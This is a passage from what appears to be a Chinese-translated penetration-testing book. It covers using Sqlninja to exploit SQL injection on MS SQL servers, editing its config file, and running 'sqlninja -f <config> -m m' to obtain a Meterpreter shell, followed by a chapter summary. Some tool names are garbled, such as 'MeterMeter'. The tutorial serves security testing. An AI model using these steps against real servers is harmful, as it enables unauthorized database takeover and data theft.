Sqlnija 与 sqlmap 类似，可以与 Metasploit 集成，当工具利用注入缺陷并创建本地 shell 时，可以使用 Metasploit 通过 MeterMeter 会话连接到目标服务器。sqlninja 需要的所有信息都保存在配置文件中。Kali Linux 中的一个示例配置文件保存在`usr/share/doc/sqlnina/sqlninja.conf.example`中。您可以使用 leafpad 编辑文件，并通过从代理（如 Burp）导出 HTTP 请求，将其保存在其中。您还需要指定目标将连接到的本地 IP 地址。该工具附带了一个详细的、分步的 HTML 指南，可以在名为`sqlninja-how.html`的文件中与配置相同的位置找到。

配置文件看起来与下面的屏幕截图中所示的配置文件类似。`httprequest_start--`和`httprequest_end--`是标记，必须在 HTTP 请求的开始和结束处定义：

![Sqlninja – MS SQL injection](../Images/image01160.jpeg)

Sqlninja 包括几个模块，如下面的屏幕截图所示。每一个都是为了使用不同的协议和技术访问服务器而创建的：

![Sqlninja – MS SQL injection](../Images/image01161.jpeg)

要开始利用，请键入`sqlninja –f <path to config file > -m m`。

Sqlninja 现在将开始注入 SQL 查询以利用漏洞，并在完成后返回 MeterMeter 会话。使用此选项，您可以完全控制目标。数据库系统一直是网络上的关键服务器，对于恶意攻击者来说，它始终是最有吸引力的目标。SQLNinja 等工具可以帮助您在对手攻击之前了解 SQL 注入缺陷的严重性。作为 IT 安全人员，攻击者获得对数据库服务器的 shell 访问权限是您最不希望看到的。

# 总结

在本章中，我们讨论了各种注入缺陷。注入漏洞是一个严重的漏洞，攻击者可以利用该漏洞完全控制服务器。我们讨论了恶意攻击者如何访问操作系统外壳，然后攻击网络上的其他服务器。当攻击者利用 SQL 注入漏洞进行攻击时，他们可以访问后端数据库上的敏感数据，这对组织来说可能是致命的。

在下一章中，我们将讨论跨站点脚本和跨站点请求伪造攻击。